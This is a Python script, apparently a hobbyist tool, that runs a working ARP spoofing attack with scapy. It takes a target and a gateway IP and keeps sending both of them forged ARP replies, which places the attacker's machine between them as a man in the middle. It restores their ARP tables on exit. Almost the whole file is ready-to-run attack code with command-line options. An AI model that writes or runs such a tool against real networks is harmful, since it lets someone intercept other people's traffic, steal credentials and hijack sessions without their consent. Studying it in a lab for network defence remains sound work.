#!/usr/bin/env python
import time

import scapy.all as scapy
import time
import subprocess
import optparse

subprocess.call(["figlet", "ARP Spoofer"])
print("\t\t\t\t\t\t by neptune0x13")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target_ip",help="Target IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Router IP address")
    (options ,arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify Target IP address, use --help for more info ")
    elif not options.gateway_ip:
        parser.error("[-] Please specify Router IP address, use --help for more info ")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoofer(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False) #sends the packet
#op=1 means ARP request op=2 means ARP response
#pdst IPfield (target)
#hwdst Macfield (target)
#psrc SourceIp (router)
#packet.show() shows packet conte

def restore(dest_ip,src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

try:
    packet_count = 0
    while True:
        spoofer(options.target_ip, options.gateway_ip)
        spoofer(options.gateway_ip, options.target_ip)
        packet_count = packet_count + 2
        print("\r[+] Packets sent: " + str(packet_count), end="")  #dynamic printing
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-]Resetting ARP tables.Please wait")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    print("\n[-]Quitting .....")
